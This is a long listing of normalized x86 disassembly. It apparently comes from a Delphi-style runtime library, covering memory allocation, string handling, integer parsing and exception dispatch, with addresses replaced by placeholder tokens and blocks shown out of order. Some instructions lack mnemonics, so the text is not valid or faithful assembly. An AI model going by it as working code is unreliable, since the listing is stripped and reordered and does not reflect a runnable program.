mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401360
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403ac8
jmp r-xdata
call sub_401e90
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401ba0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e08
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401ba0
sub_40241c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401e90
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401ba0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401f94
test al al
je r-xdata
call sub_401ba0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c64
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e08
jmp r-xdata
sub_4025f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026a9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40241c
test al al
je r-xdata
push rw-data
call sub_401358
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020e8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028b8
mov eax ebx
call sub_402278
retn
push rw-data
call sub_401360
sub_4026bc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402818
sub_4026dc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402818
sub_4026fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402818
mov [ ecx ] eax
mov al 0x2
jmp sub_402818
retn
mov [ ecx ] eax
retn
sub_40278c
push ebx
push esi
call sub_405d7c
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405d7c
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405d7c
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027cc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405d7c
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027c0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402854
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028b8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4028f8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_40462c
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_4029e4
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_403fe0
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40125c
mov ecx eax
mov edx esp
mov eax ebx
call sub_4040d0
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4028f8
mov edi eax
test esi esi
je r-xdata
sub_402a74
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402ab4
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402844
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402b08
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402844
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402844
jmp r-xdata
sub_402b60
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402b9c
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_402bb8
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c3c
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402cac
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402ccc
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402dac
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402dec
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e9f ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e9f ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e9f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4030d8
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_403108
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403179
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ac
retn
sub_4031f4
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_40329c
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4032f4
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404a1c
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403314
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405664
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403344
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4033c8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033d8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4033cf
lea eax [ ebp - 0x8 ]
call sub_40564c
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403314
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405664
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033d8
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_40341c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4034bc
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40345c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_40348c
push eax
push ecx
mov eax [ eax ]
call sub_40345c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403fd4
call [ rw-data ]
sub_4034a4
push esi
mov esi edx
mov eax [ eax ]
call sub_40345c
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403fd4
call [ rw-data ]
sub_4034ec
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_40345c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403514
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403564
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4035b4
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4035dd
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403648
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403684
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403698
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4036ac
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4036cc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4036ac
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403730
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4031cc
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405d7c
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403698
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403648
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_40385c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4031cc
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403648
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
